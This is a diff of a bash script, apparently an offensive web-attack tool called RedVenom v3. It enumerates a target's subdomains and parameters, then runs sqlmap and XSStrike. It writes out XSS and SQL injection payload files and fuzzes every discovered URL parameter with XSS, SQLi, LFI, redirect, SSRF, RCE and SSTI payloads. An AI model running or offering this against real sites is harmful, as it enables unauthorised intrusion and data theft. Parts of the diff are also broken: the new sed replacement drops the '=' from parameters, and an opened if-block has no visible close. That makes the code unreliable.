@@ -46,7 +46,7 @@ ARJUN_CMD=$(command -v arjun 2>/dev/null)
 SQLMAP_CMD=$(command -v sqlmap 2>/dev/null)
 [[ -z "$SQLMAP_CMD" ]] && echo -e "${YELLOW}[!] sqlmap not found. SQLi scan disabled.${NC}"
 
-XSSTRIKEreplace_CMD=$(command -v xsstrike 2>/dev/null)
+XSSTRIKE_CMD=$(command -v xsstrike 2>/dev/null)
 [[ -z "$XSSTRIKE_CMD" ]] && [[ -f "XSStrike/xsstrike.py" ]] && XSSTRIKE_CMD="python3 XSStrike/xsstrike.py"
 [[ -z "$XSSTRIKE_CMD" ]] && echo -e "${YELLOW}[!] XSStrike not found. XSS scan disabled.${NC}"
 
@@ -167,24 +167,44 @@ echo -e "${CYAN}[+] Cleaning old recon data...${NC}"
 rm -rf recon_venom/*
 mkdir -p recon_venom/{js,params}
 
-echo -e "${CYAN}[*] Running Subfinder...${NC}"
-$SUBFINDER_CMD -d $TARGET -silent -o recon_venom/subdomains.txt & PID1=$!
+if [[ -n "$SUBFINDER_CMD" ]]; then
+    echo -e "${CYAN}[*] Running Subfinder...${NC}"
+    $SUBFINDER_CMD -d "$TARGET" -silent -o recon_venom/subdomains.txt & PID1=$!
+else
+    echo -e "${RED}[-] Subfinder not found. Skipping.${NC}"
+    PID1=""
+fi
 
-echo -e "${CYAN}[*] Running gau...${NC}"
-$GAU_CMD --subs --o recon_venom/gau_urls.txt $TARGET & PID2=$!
+if [[ -n "$GAU_CMD" ]]; then
+    echo -e "${CYAN}[*] Running gau...${NC}"
+    $GAU_CMD --subs --o recon_venom/gau_urls.txt "$TARGET" & PID2=$!
+else
+    echo -e "${RED}[-] gau not found. Skipping.${NC}"
+    PID2=""
+fi
 
-wait $PID1
-echo -e "${CYAN}[*] Running httpx...${NC}"
-$HTTPX_CMD -l recon_venom/subdomains.txt -silent -o recon_venom/httpx_live.txt & PID3=$!
+[[ -n "$PID1" ]] && wait $PID1
+if [[ -n "$HTTPX_CMD" ]]; then
+    echo -e "${CYAN}[*] Running httpx...${NC}"
+    $HTTPX_CMD -l recon_venom/subdomains.txt -silent -o recon_venom/httpx_live.txt & PID3=$!
+else
+    echo -e "${RED}[-] httpx not found. Skipping.${NC}"
+    PID3=""
+fi
 
-wait $PID2
-wait $PID3
+[[ -n "$PID2" ]] && wait $PID2
+[[ -n "$PID3" ]] && wait $PID3
+
 
 echo -e "${CYAN}[*] Running ParamSpider...${NC}"
 RAW_OUTPUT="recon_venom/params/paramspider_raw.txt"
 CLEAN_OUTPUT="recon_venom/params/paramspider_cleaned.txt"
 > "$RAW_OUTPUT"
 > "$CLEAN_OUTPUT"
+if [[ ! -s recon_venom/httpx_live.txt ]]; then
+    echo -e "${RED}[-] No live subdomains found. Skipping ParamSpider.${NC}"
+else
+    echo -e "${CYAN}[*] Running ParamSpider...${NC}"
 
 while read -r domain; do
     [[ -z "$domain" ]] && continue
@@ -203,7 +223,12 @@ $ARJUN_CMD -i recon_venom/httpx_live.txt -oT recon_venom/params/arjun_params.txt
 
 # JavaScript link extraction (filtered by target domain)
 echo -e "${CYAN}[*] Finding JS files from gau output...${NC}"
-grep -Ei '\.js($|\?)' recon_venom/gau_urls.txt | grep "$TARGET" | sort -u > recon_venom/js/js_files.txt
+
+if [[ ! -s recon_venom/gau_urls.txt ]]; then
+    echo -e "${RED}[-] gau output not found. Skipping JS file extraction.${NC}"
+else
+    grep -Ei '\.js($|\?)' recon_venom/gau_urls.txt | grep "$TARGET" | sort -u > recon_venom/js/js_files.txt
+fi
 
 echo -e "${CYAN}[*] Extracting endpoints from JS files (filtered)...${NC}"
 > recon_venom/js/endpoints.txt
@@ -232,7 +257,7 @@ else
 fi
 
 echo -e "${GREEN}[✔] Recon phase complete. Output in:${NC} recon_venom/all_cleaned_urls.txt"
-GREEN}[✔] Recon phase complete. Output in:${NC} recon_venom/all_cleaned_urls.txt"
+
 
 #sqlmap+xsstrike phase
 SQLMAP_CMD=$(command -v sqlmap)
@@ -258,7 +283,7 @@ while read -r url; do
     manage_xs_jobs
     {
         echo -e "${CYAN}[XSStrike] Testing: $url${NC}"
-        XS_OUTPUT=$(python3 XSStrike/xsstrike.py -u "$url" --skip --crawl 2>/dev/null | tee -a recon_venom/xsstrike_raw.txt)
+        XS_OUTPUT=$($XSSTRIKE_CMD -u "$url" --skip --crawl 2>/dev/null | tee -a recon_venom/xsstrike_raw.txt)
 
         if echo "$XS_OUTPUT" | grep -iqE 'vulnerable|vulnerability|XSS'; then
             echo "$url [VULNERABLE]" | tee -a recon_venom/xsstrike_results_clean.txt recon_venom/xsstrike_vulns.txt
@@ -282,7 +307,8 @@ echo -e "${CYAN}[*] Preparing payload files and confirmed folder...${NC}"
 mkdir -p payloads recon_venom/confirmed
 
 # Payload sets
-cat > payloads/xss.txt << 'EOF'
+
+cat > payloads/xss.txt <<'EOF'
 "><svg/onload=alert(1)>
 "><script>alert(1)</script>
 '><img src=x onerror=alert(1)>
@@ -292,6 +318,7 @@ cat > payloads/xss.txt << 'EOF'
 "><details/open/ontoggle=alert(1)>
 "><marquee/onstart=alert(1)>
 EOF
+
 
 cat > payloads/sqli.txt << 'EOF'
 ' OR 1=1 --
@@ -411,38 +438,45 @@ mapfile -t JSON_PAYLOADS < payloads/json.txt
 
 while read -r url; do
     for payload in "${XSS_PAYLOADS[@]}"; do
-        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
+        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")
+
         detect_vuln "$fuzzed" "$payload" "XSS" & manage_jobs
     done
 
     for payload in "${SQLI_PAYLOADS[@]}"; do
-        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
+        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")
+
         detect_vuln "$fuzzed" "$payload" "SQLi" & manage_jobs
     done
 
     for payload in "${LFI_PAYLOADS[@]}"; do
-        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
+        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")
+
         detect_vuln "$fuzzed" "$payload" "LFI" & manage_jobs
     done
 
     for payload in "${REDIRECT_PAYLOADS[@]}"; do
-        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
+        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")
+
         detect_vuln "$fuzzed" "$payload" "Redirect" & manage_jobs
     done
 
     for payload in "${SSRF_PAYLOADS[@]}"; do
-        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
+        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")
+
         echo -e "[SSRF] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
         $CURL_CMD -sk "$fuzzed" -o /dev/null & manage_jobs
     done
 
     for payload in "${RCE_PAYLOADS[@]}"; do
-        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
+        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")
+
         detect_vuln "$fuzzed" "$payload" "RCE" & manage_jobs
     done
 
     for payload in "${SSTI_PAYLOADS[@]}"; do
-        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
+        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")
+
         detect_vuln "$fuzzed" "$payload" "SSTI" & manage_jobs
     done
 
@@ -502,7 +536,6 @@ ai_menu() {
 
 ai_menu
 
-echo -e "${GREEN}[✔] RedVenom v3 finished. All results saved in ${CYAN}recon_venom/${NC} and ${CYAN}confirmed/${NC} folders.${NC}"
 
 # PHASE 6 — Cleanup & VPN Disconnect
 if [[ "$VPN_OPTION" == "y" ]]; then
